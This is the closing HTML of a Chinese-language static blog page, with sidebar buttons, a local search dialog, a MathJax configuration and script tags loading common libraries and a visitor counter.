fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container').forEach(node => {
+            if (node.hasAttribute('display')) {
+              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
+            } else {
+              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script src="/js/jquery.min.js"></script><script src="/js/foot.js"></script><script src="/js/nav.js"></script><script src="/js/languages.js"></script><script src="/js/calendar.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
